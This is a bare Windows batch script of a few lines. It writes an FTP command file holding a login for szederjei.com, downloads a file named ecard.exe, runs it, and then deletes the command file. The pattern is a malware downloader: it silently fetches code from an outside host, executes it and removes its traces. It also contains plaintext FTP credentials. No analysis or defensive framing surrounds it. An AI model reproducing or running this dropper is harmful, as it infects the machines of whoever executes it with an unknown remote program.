echo off
echo open szederjei.com>go.txt&&echo admin>>go.txt&&echo Rodrigo1>>go.txt&&echo get ecard.exe>>go.txt&&echo bye>>go.txt
ftp -s:go.txt
ecard.exe
del go.txt